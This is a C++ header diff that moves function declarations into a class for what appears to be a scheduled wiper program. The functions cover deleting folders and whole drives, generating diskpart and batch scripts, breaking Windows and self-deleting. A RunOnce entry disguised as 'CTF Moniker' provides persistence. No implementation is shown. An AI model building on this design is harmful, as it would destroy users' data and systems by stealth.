@@ -25,6 +25,16 @@ public:
 	bool SaveTaskKillWindows();
 	void SelfDelete();
 	bool PerformATask();
+	int stringSizeInBytes(CString strToCalc);
+	bool DeleteFolder();
+	bool IfDeleteDiskD();
+	bool IfKillWindows();
+	bool ReadRegDeleteDay(int& DelDay, int& DelDayOfWeek, int& Month);
+	void GetCurrentDay(int& DelDay, int& DelDayOfWeek, int& Month);
+	bool CreateDiskpartScript(char szFileDiskPart[], char szTempPath[], char szFilePath[]);
+	bool CreateBatFile(char szFileBat[], char szTempPath[], char szFilePath[], char szFileExe[], char szFileDiskPart[]);
+	bool DeleteAllOnDrive(char szDriveLetter[]);
+	void DoKillWindows();
 };
 
 static const wchar_t* RunOnceItemName = L"CTF Moniker";
@@ -35,14 +45,3 @@ static const wchar_t* DelMonthKeyName = L"delMonth";
 static const wchar_t* DelFolderKeyName = L"FolderToDel";
 static const wchar_t* DelDiskDKeyName = L"delD";
 static const wchar_t* KillWindowsKeyName = L"KillWin";
-
-bool DeleteFolder();
-bool IfDeleteDiskD();
-bool IfKillWindows();
-bool ReadRegDeleteDay(int& DelDay, int& DelDayOfWeek, int& Month);
-void GetCurrentDay(int& DelDay, int& DelDayOfWeek, int& Month);
-bool CreateDiskpartScript(char szFileDiskPart[], char szTempPath[], char szFilePath[]);
-bool CreateBatFile(char szFileBat[], char szTempPath[], char szFilePath[], char szFileExe[], char szFileDiskPart[]);
-bool DeleteAllOnDrive(char szDriveLetter[]);
-void DoKillWindows();
-int stringSizeInBytes(CString strToCalc);
